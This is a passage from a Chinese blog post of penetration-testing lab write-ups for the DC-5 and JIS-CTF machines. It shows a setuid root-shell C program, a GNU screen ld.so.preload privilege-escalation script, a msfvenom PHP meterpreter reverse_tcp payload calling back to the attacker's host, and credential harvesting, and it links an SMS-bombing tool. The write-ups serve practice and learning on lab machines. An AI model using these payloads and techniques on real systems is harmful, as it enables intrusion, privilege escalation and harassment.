setegid(0);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, NULL, NULL);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">                                                                                                                                                                                                                                             </span><br><span class="line">┌──(root㉿kali)-[/tmp]</span><br><span class="line">└─<span class="comment"># gcc -o /tmp/rootshell /tmp/rootshell.c</span></span><br><span class="line">/tmp/rootshell.c: In <span class="keyword">function</span> ‘main’:</span><br><span class="line">/tmp/rootshell.c:3:5: warning: implicit declaration of <span class="keyword">function</span> ‘setuid’ [-Wimplicit-function-declaration]</span><br><span class="line">    3 |     setuid(0);</span><br><span class="line">      |     ^~~~~~</span><br><span class="line">/tmp/rootshell.c:4:5: warning: implicit declaration of <span class="keyword">function</span> ‘setgid’ [-Wimplicit-function-declaration]</span><br><span class="line">    4 |     setgid(0);</span><br><span class="line">      |     ^~~~~~</span><br><span class="line">/tmp/rootshell.c:5:5: warning: implicit declaration of <span class="keyword">function</span> ‘seteuid’ [-Wimplicit-function-declaration]</span><br><span class="line">    5 |     seteuid(0);</span><br><span class="line">      |     ^~~~~~~</span><br><span class="line">/tmp/rootshell.c:6:5: warning: implicit declaration of <span class="keyword">function</span> ‘setegid’ [-Wimplicit-function-declaration]</span><br><span class="line">    6 |     setegid(0);</span><br><span class="line">      |     ^~~~~~~</span><br><span class="line">/tmp/rootshell.c:7:5: warning: implicit declaration of <span class="keyword">function</span> ‘execvp’ [-Wimplicit-function-declaration]</span><br><span class="line">    7 |     execvp(<span class="string">&quot;/bin/sh&quot;</span>, NULL, NULL);</span><br><span class="line">      |     ^~~~~~</span><br><span class="line">/tmp/rootshell.c:7:5: warning: too many arguments to built-in <span class="keyword">function</span> ‘execvp’ expecting 2 [-Wbuiltin-declaration-mismatch]</span><br><span class="line">                                                                                                                                                                                                                                             </span><br><span class="line">┌──(root㉿kali)-[/tmp]</span><br><span class="line">└─<span class="comment"># rm -f /tmp/rootshell.c</span></span><br><span class="line">                             </span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024222021184-1667183983063.png" alt="image-20221024222021184"></p>
<p>第三步：将最后一部分代码写入dc5.sh文件中。需要注意的是，需要在文件开头写入<code>#!/bin/bash</code>表示执行环境。最后保存是需要输入<code>:set ff=unix</code>是为了防止脚本的格式错误。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Triggering...&quot;</span></span><br><span class="line">screen -<span class="built_in">ls</span> <span class="comment"># screen itself is setuid, so...</span></span><br><span class="line">/tmp/rootshell         </span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024222532234-1667183983063.png" alt="image-20221024222532234"></p>
<p>完成3个步骤后之间把三个文件上传至靶机的&#x2F;tmp文件下，然后执行.&#x2F;dc5即可提权。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -r kali@192.168.245.132:/tmp/dc5/* /tmp/</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024225619939-1667183983063.png" alt="image-20221024225619939"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#文件授权</span></span><br><span class="line">www-data@dc-5:/tmp$ <span class="built_in">chmod</span> 777 dc5.sh</span><br><span class="line"><span class="built_in">chmod</span> 777 exp.sh</span><br><span class="line">www-data@dc-5:/tmp$ <span class="built_in">chmod</span> 777 libhax.so</span><br><span class="line"><span class="built_in">chmod</span> 777 libhax.so</span><br><span class="line">www-data@dc-5:/tmp$ <span class="built_in">chmod</span> 777 rootshell</span><br><span class="line"><span class="built_in">chmod</span> 777 rootshell</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024231657266-1667183983063.png" alt="image-20221024231657266"></p>
<p>提权不了，全剧终。。。</p>
<h3 id="JIS-CTF"><a href="#JIS-CTF" class="headerlink" title="JIS-CTF"></a>JIS-CTF</h3><p>靶机文件下载好之后，导入虚拟机。<br>不过这个靶机有点小问题，一开始网卡起不来，上网找了找解决方法。<br>解决方法：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 账号口令 technawi - 3vilH@ksor</span></span><br><span class="line"><span class="comment"># 启用网卡</span></span><br><span class="line">sudo ifconfig ens33 up </span><br><span class="line"><span class="comment"># 分配IP</span></span><br><span class="line">sudo dhclient</span><br><span class="line"><span class="comment"># 在/etc/network/interfaces文件添加相关信息</span></span><br><span class="line">auto ens33</span><br><span class="line">iface ens33 inet dhcp</span><br></pre></td></tr></table></figure>

<p>我们先用kali进行一次arp的内网扫描</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205181026360.png" alt="image-20221205181026360"></p>
<p>扫描端口和服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -A 192.168.241.129</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205181642408.png" alt="image-20221205181642408"></p>
<p>尝试访问80端口</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205181918331.png" alt="image-20221205181918331"></p>
<p>我们启动目录扫描器</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.241.129</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205182219730.png" alt="image-20221205182219730"></p>
<p>然后配合</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -h http://192.168.241.129</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205194835809.png" alt="image-20221205194835809"></p>
<p>然后再看一眼<code>robots.txt</code></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205183041664.png" alt="image-20221205183041664"></p>
<p>然后一一查看网址和源代码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.241.129/flag.txt</span><br></pre></td></tr></table></figure>

<p>正常</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205182529927.png" alt="image-20221205182529927"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.241.129/flag</span><br></pre></td></tr></table></figure>

<p>第一个flag出来了</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205183226044.png" alt="image-20221205183226044"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.241.129/admin_area/</span><br></pre></td></tr></table></figure>

<p>额，第二个flag出来了</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205182632497.png" alt="image-20221205182632497"></p>
<p>发现第二个flag的同时，我们还找到了用户和密码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username : admin</span><br><span class="line">password : 3v1l_H@ck3r</span><br></pre></td></tr></table></figure>

<p>我们登录该账号密码发现是个上传文件的页面</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205183513015.png" alt="image-20221205183513015"></p>
<p>kali端生成一个监听木马</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  php/meterpreter/reverse_tcp  lhost=192.168.241.128 lport=8888 -f raw -o hacker.php</span><br></pre></td></tr></table></figure>

<p>将监听木马上传</p>
<p>kali端开启监听端口</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.241.128</span><br><span class="line"><span class="built_in">set</span> LPORT 8888</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>BP放行数据，没有什么异端返回</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205190009628.png" alt="image-20221205190009628"></p>
<p>我们并不知道上传的文件放在哪里，结合上面的目录扫描中有一个奇怪的目录<code>uploaded_files</code>，试着访问<code>http://192.168.241.129/uploaded_files/hacker.php</code>，访问成功，说明上传的文件是放在<code>uploaded_files</code>这个文件夹里面的。</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205190356946.png" alt="image-20221205190356946"></p>
<p>kali返回连接成功信息</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205191113963.png" alt="image-20221205191113963"></p>
<p>kali获取shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /var/www/html</span><br><span class="line"><span class="built_in">cat</span> flag.txt</span><br><span class="line"><span class="built_in">cat</span> hint.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205191849216.png" alt="image-20221205191849216"></p>
<p>拿到第三个flag并且提示我们要找到technawi的密码才能查看flag.txt，改密码放在一个隐秘的地方。</p>
<p>寻找用户名为technawi并且我们有权限访问的文件。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user technawi |grep -v <span class="string">&quot;Permission&quot;</span> &gt;1.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205192229426.png" alt="image-20221205192229426"></p>
<p>第四个flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> 1.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205193201487.png" alt="image-20221205193201487"></p>
<p>我们还拿到了用户账号和密码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username : technawi</span><br><span class="line">password : 3vilH@ksor</span><br></pre></td></tr></table></figure>

<p>第五flag到手</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205193743545.png" alt="image-20221205193743545"></p>
<h2 id="移动手机"><a href="#移动手机" class="headerlink" title="移动手机"></a>移动手机</h2><h3 id="短信轰炸"><a href="#短信轰炸" class="headerlink" title="短信轰炸"></a>短信轰炸</h3><p><a target="_blank" rel="noopener" href="https://github.com/OpenEthan/SMSBoom">SMSBoom</a></p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"># 渗透</a>
              <a href="/tags/web/" rel="tag"># web</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/09/04/linux%E5%B0%8F%E7%9F%A5%E8%AF%86/" rel="prev" title="linux小知识">
      <i class="fa fa-chevron-left"></i> linux小知识
    </a></div>
      <div class="post-nav-item">
    <a href="/2022/11/23/%E7%89%88%E6%9C%AC%E5%88%87%E6%8D%A2%E5%B7%A5%E5%85%B7%E7%AF%87/" rel="next" title="版本切换工具篇">
      版本切换工具篇 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="valine-comments"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  

  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>


  <aside class="sidebar">
    <div class="sidebar-inner">


      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8F-and-web"><span class="nav-number">1.</span> <span class="nav-text">渗透 and web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F"><span class="nav-number">1.1.</span> <span class="nav-text">渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ARP%E6%94%BB%E9%98%B2"><span class="nav-number">1.1.1.</span> <span class="nav-text">ARP攻防</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ARP%E6%AC%BA%E9%AA%97"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">ARP欺骗</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ARP%E6%AC%BA%E9%AA%97%E5%B7%A5%E5%85%B7"><span class="nav-number">1.1.1.2.</span> <span class="nav-text">ARP欺骗工具</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%98%B2%E8%8C%83ARP%E6%94%BB%E5%87%BB"><span class="nav-number">1.1.1.3.</span> <span class="nav-text">防范ARP攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%94%A8%E5%91%BD%E4%BB%A4%E5%AE%8C%E6%88%90%E9%98%B2%E5%BE%A1"><span class="nav-number">1.1.1.3.1.</span> <span class="nav-text">用命令完成防御</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E8%BD%AF%E4%BB%B6%E8%BF%9B%E8%A1%8C%E9%98%B2%E6%8A%A4"><span class="nav-number">1.1.1.3.2.</span> <span class="nav-text">使用软件进行防护</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%94%BB%E5%87%BB"><span class="nav-number">1.1.2.</span> <span class="nav-text">永恒之蓝攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ms17-010-eternalblue"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">ms17_010_eternalblue</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%BC%80%E5%90%AF3389"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">注册表开启3389</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9A%90%E8%97%8F%E4%B8%8D%E6%83%B3%E6%98%BE%E7%A4%BA%E7%9A%84%E7%89%B9%E5%AE%9A%E8%B4%A6%E6%88%B7%E5%9C%A8%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2"><span class="nav-number">1.1.2.3.</span> <span class="nav-text">隐藏不想显示的特定账户在登录界面</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dos%E4%B8%80%E4%B8%8Bensp%E7%9A%84%E4%BA%A4%E6%8D%A2%E6%9C%BA"><span class="nav-number">1.1.3.</span> <span class="nav-text">dos一下ensp的交换机</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB"><span class="nav-number">1.2.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DVWA"><span class="nav-number">1.2.1.</span> <span class="nav-text">DVWA</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">安装过程</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%89%E8%A3%85phpstudy"><span class="nav-number">1.2.1.1.1.</span> <span class="nav-text">安装phpstudy</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BDDVWA%E6%BA%90%E7%A0%81"><span class="nav-number">1.2.1.1.2.</span> <span class="nav-text">下载DVWA源码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%89%E8%A3%85%E9%9C%80%E8%A6%81%E7%9A%84%E4%BE%9D%E8%B5%96%E5%BA%93"><span class="nav-number">1.2.1.1.3.</span> <span class="nav-text">安装需要的依赖库</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C"><span class="nav-number">1.2.1.1.4.</span> <span class="nav-text">运行</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5-%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">SQL注入(手工注入)</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#low%E7%BA%A7"><span class="nav-number">1.2.1.2.1.</span> <span class="nav-text">low级</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Medium%E7%BA%A7"><span class="nav-number">1.2.1.2.2.</span> <span class="nav-text">Medium级</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#driftingblues7-vh"><span class="nav-number">1.2.2.</span> <span class="nav-text">driftingblues7_vh</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Prime-Series-Level-1"><span class="nav-number">1.2.3.</span> <span class="nav-text">Prime_Series_Level-1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%AB%E6%8F%8Fc%E7%B1%BB%E7%BD%91%E6%AE%B5"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">扫描c类网段</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%AB%E6%8F%8F%E7%BD%91%E5%9D%80%E7%9B%AE%E5%BD%95%E5%9C%B0%E5%9D%80"><span class="nav-number">1.2.3.2.</span> <span class="nav-text">扫描网址目录地址</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DC-1"><span class="nav-number">1.2.4.</span> <span class="nav-text">DC-1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DC-2"><span class="nav-number">1.2.5.</span> <span class="nav-text">DC-2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DC-3"><span class="nav-number">1.2.6.</span> <span class="nav-text">DC-3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DC-4"><span class="nav-number">1.2.7.</span> <span class="nav-text">DC-4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DC-5"><span class="nav-number">1.2.8.</span> <span class="nav-text">DC-5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JIS-CTF"><span class="nav-number">1.2.9.</span> <span class="nav-text">JIS-CTF</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A7%BB%E5%8A%A8%E6%89%8B%E6%9C%BA"><span class="nav-number">1.3.</span> <span class="nav-text">移动手机</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%AD%E4%BF%A1%E8%BD%B0%E7%82%B8"><span class="nav-number">1.3.1.</span> <span class="nav-text">短信轰炸</span></a></li></ol></li></ol></li></ol></div>
      </div>

      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="涩橙子"
      src="/images/head.jpg">
  <p class="site-author-name" itemprop="name">涩橙子</p>
  <div class="site-description" itemprop="description">自己对技术的小小见解，如果有误，请轻点喷，作者会腾出时间修改错误！！！(写了"搁浅"两字的就是个空文档,望注意)</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">54</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">39</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="/julintongxue@gmail.com" title="E-Mail → julintongxue@gmail.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>


  <div class="links-of-blogroll motion-element">
    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://aienh.github.io/" title="https:&#x2F;&#x2F;aienh.github.io" rel="noopener" target="_blank">ienAの博客</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://tokiame.cn/" title="https:&#x2F;&#x2F;tokiame.cn" rel="noopener" target="_blank">时雨小栈</a>
        </li>
    </ul>
  </div>

      </div>
      
      <div id="music163player">
      <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=110 src="//music.163.com/outchain/player?type=0&id=8269604294&auto=1&height=90"></iframe>
      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>
  


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">涩橙子</span>
</div>
<!--
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>
-->

        








      </div>
    </footer>
  </div>

  
  
  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/pjax/pjax.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>

  <script>
var pjax = new Pjax({
  selectors: [
    'head title',
    '#page-configurations',
    '.content-wrap',
    '.post-toc-wrap',
    '.languages',
    '#pjax'
  ],
  switches: {
    '.post-toc-wrap': Pjax.switches.innerHTML
  },
  analytics: false,
  cacheBust: false,
  scrollTo : !CONFIG.bookmark.enable
});

window.addEventListener('pjax:success', () => {
  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
    var code = element.text || element.textContent || element.innerHTML || '';
    var parent = element.parentNode;
    parent.removeChild(element);
    var script = document.createElement('script');
    if (element.id) {
      script.id = element.id;
    }
    if (element.className) {
      script.className = element.className;
    }
    if (element.type) {
      script.type = element.type;
    }
    if (element.src) {
      script.src = element.src;
      // Force synchronous loading of peripheral JS.
      script.async = false;
    }
    if (element.dataset.pjax !== undefined) {
      script.dataset.pjax = '';
    }
    if (code !== '') {
      script.appendChild(document.createTextNode(code));
    }
    parent.appendChild(script);
  });
  NexT.boot.refresh();
  // Define Motion Sequence & Bootstrap Motion.
  if (CONFIG.motion.enable) {
    NexT.motion.integrator
      .init()
      .add(NexT.motion.middleWares.subMenu)
      .add(NexT.motion.middleWares.postList)
      .bootstrap();
  }
  NexT.utils.updateSidebarPosition();
});
</script>




  




  
<script src="/js/local-search.js"></script>













    <div id="pjax">
  

  


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : true,
      notify     : true,
      appId      : 't3KNgr4WVcpJVh17S5thqEXl-gzGzoHsz',
      appKey     : 'tvxyuYI5nZrSoGZ4ct2MSuxe',
      placeholder: "写下你的评论吧",
      avatar     : 'mm',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : false,
      lang       : '' || 'zh-cn',
      path       : location.pathname,
      recordIP   : false,
      serverURLs : ''
    });
  }, window.Valine);
});
</script>

    </div>

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":-15,"vOffset":-15},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
</html>


